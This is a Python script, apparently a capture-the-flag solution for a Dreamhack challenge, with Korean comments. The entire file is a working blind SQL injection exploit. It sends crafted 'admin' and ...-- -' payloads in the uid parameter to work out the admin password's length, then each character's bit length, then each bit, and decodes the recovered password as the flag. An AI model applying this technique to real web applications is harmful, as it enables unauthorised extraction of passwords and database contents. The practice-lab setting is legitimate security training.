from requests import get

host = 'http://host3.dreamhack.games:10172/'

password_length = 0; #패스워드 길이
bts = [] #각 character의 비트길이
password = "" # 비밀번호(flag)

while True:
    password_length += 1
    query = f"admin' and char_length(upw) = {password_length}-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text:
        break
# password 길이 확인

print(f"password length: {password_length}")

for i in range(1, password_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"character {i}'s bit length: {bit_length}")
    bts.append(bit_length)

# 각 password character의 비트 수를 확인.

for idx, i in enumerate(bts, start = 1):
    bits = ""
    for j in range(1, i+1):
        query = f"admin' and substr(bin(ord(substr(upw, {idx}, 1))), {j}, 1) = '1'-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            bits += "1"
        else:
            bits += "0"
    print(f"character {idx}'s bits: {bits}")
    password += int.to_bytes(int(bits, 2), (i+7)//8, "big").decode('utf-8')
 
 # idx는 character 번호 i는 character의 비트 수.
 # j는 비트 순서 1~i+1까지
 # 이를 bits 문자열에 넣고
 # password += int.to_bytes(int(bits, 2), (i+7)//8, "big").decode('utf-8')에 넣어 UTF-8 형식으로 바꿈.

print(password)
# password 출력.